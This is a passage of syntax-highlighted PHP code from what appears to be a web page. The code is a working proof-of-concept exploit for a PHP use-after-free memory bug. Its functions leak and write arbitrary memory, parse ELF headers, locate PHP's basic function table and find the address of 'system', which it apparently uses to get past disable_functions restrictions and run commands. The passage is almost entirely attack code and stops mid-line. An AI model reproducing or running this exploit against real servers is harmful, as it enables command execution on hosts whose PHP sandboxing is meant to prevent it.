punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>            <span class=\"token variable\">$v</span> <span class=\"token operator\">>></span><span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$addr</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$p</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$s</span> <span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        <span class=\"token keyword\">global</span> <span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$helper</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$addr</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$p</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token variable\">$leak</span> <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$helper</span><span class=\"token operator\">-></span><span class=\"token property\">a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span> <span class=\"token operator\">!=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token variable\">$leak</span> <span class=\"token operator\">%=</span> <span class=\"token number\">2</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$leak</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">parse_elf</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>        <span class=\"token variable\">$e_type</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>        <span class=\"token variable\">$e_phoff</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>        <span class=\"token variable\">$e_phentsize</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x36</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>        <span class=\"token variable\">$e_phnum</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$e_phnum</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>            <span class=\"token variable\">$header</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$base</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$e_phoff</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">*</span> <span class=\"token variable\">$e_phentsize</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>            <span class=\"token variable\">$p_type</span>  <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$header</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>            <span class=\"token variable\">$p_flags</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$header</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>            <span class=\"token variable\">$p_vaddr</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$header</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>            <span class=\"token variable\">$p_memsz</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$header</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$p_type</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$p_flags</span> <span class=\"token operator\">==</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>                <span class=\"token variable\">$data_addr</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$e_type</span> <span class=\"token operator\">==</span> <span class=\"token number\">2</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$p_vaddr</span> <span class=\"token punctuation\">:</span> <span class=\"token variable\">$base</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$p_vaddr</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>                <span class=\"token variable\">$data_size</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$p_memsz</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$p_type</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$p_flags</span> <span class=\"token operator\">==</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"74\"></td><td><pre>                <span class=\"token variable\">$text_size</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$p_memsz</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$data_addr</span> <span class=\"token operator\">||</span> <span class=\"token operator\">!</span><span class=\"token variable\">$text_size</span> <span class=\"token operator\">||</span> <span class=\"token operator\">!</span><span class=\"token variable\">$data_size</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">[</span><span class=\"token variable\">$data_addr</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$text_size</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$data_size</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">get_basic_funcs</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$elf</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>        <span class=\"token keyword\">list</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data_addr</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$text_size</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$data_size</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$elf</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$data_size</span> <span class=\"token operator\">/</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>            <span class=\"token variable\">$leak</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data_addr</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$leak</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$base</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$leak</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$base</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$data_addr</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$base</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>                <span class=\"token variable\">$deref</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$leak</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>                </pre></td></tr><tr><td data-num=\"91\"></td><td><pre>                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$deref</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0x746e6174736e6f63</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>                    <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>            <span class=\"token variable\">$leak</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data_addr</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">+</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$leak</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$base</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$leak</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$base</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$data_addr</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$base</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>                <span class=\"token variable\">$deref</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$leak</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>                </pre></td></tr><tr><td data-num=\"99\"></td><td><pre>                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$deref</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0x786568326e6962</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>                    <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token variable\">$data_addr</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">get_binary_base</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$binary_leak</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>        <span class=\"token variable\">$base</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>        <span class=\"token variable\">$start</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$binary_leak</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xfffffffffffff000</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0x1000</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>            <span class=\"token variable\">$addr</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$start</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x1000</span> <span class=\"token operator\">*</span> <span class=\"token variable\">$i</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>            <span class=\"token variable\">$leak</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$addr</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$leak</span> <span class=\"token operator\">==</span> <span class=\"token number\">0x10102464c457f</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token variable\">$addr</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">get_system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$basic_funcs</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>        <span class=\"token variable\">$addr</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$basic_funcs</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>        <span class=\"token keyword\">do</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>            <span class=\"token variable\">$f_entry</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$addr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>            <span class=\"token variable\">$f_name</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f_entry</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f_name</span> <span class=\"token operator\">==</span> <span class=\"token number\">0x6d6574737973</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$addr</span> <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>            <span class=\"token variable\">$addr</span> <span class=\"token operator\">+=</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f_entry</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">trigger_uaf</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$arg</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>        <span class=\"token variable\">$arg</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_shuffle</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>        <span class=\"token variable\">$vuln</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Vuln</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>        <span class=\"token variable\">$vuln</span><span class=\"token operator\">-></span><span class=\"token property\">a</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$arg</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre></pre></td></tr><tr><td data-num=\"140\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">stristr</span><span class=\"token punctuation\">(</span><span class=\"token constant\">PHP_OS</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'WIN'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'This PoC is for *nix systems only.'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"143\"></td><td><pre></pre></td></tr><tr><td data-num=\"144\"></td><td><pre>    <span class=\"token variable\">$n_alloc</span> <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"145\"></td><td><pre>    <span class=\"token variable\">$contiguous</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre>    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$n_alloc</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>        <span class=\"token variable\">$contiguous</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_shuffle</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre></pre></td></tr><tr><td data-num=\"149\"></td><td><pre>    <span class=\"token function\">trigger_uaf</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'x'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"150\"></td><td><pre>    <span class=\"token variable\">$abc</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$backtrace</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'args'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"151\"></td><td><pre></pre></td></tr><tr><td data-num=\"152\"></td><td><pre>    <span class=\"token variable\">$helper</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Helper</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"153\"></td><td><pre>    <span class=\"token variable\">$helper</span><span class=\"token operator\">-></span><span class=\"token property\">b</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$x</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"154\"></td><td><pre></pre></td></tr><tr><td data-num=\"155\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">79</span> <span class=\"token operator\">||</span> <span class=\"token class-name\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"156\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"UAF failed\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"157\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"158\"></td><td><pre></pre></td></tr><tr><td data-num=\"159\"></td><td><pre>    <span class=\"token variable\">$closure_handlers</span> <span class=\"token operator\">=</span> <span class=\"token function\">str2ptr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"160\"></td><td><pre>    <span class=\"token variable\">$php_heap</span> <span class=\"token operator\">=</span> <span class=\"token function\">str2ptr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x58</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"161\"></td><td><pre>    <span class=\"token variable\">$abc_addr</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$php_heap</span> <span class=\"token operator\">-</span> <span class=\"token number\">0xc8</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"162\"></td><td><pre></pre></td></tr><tr><td data-num=\"163\"></td><td><pre>    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x60</span><span 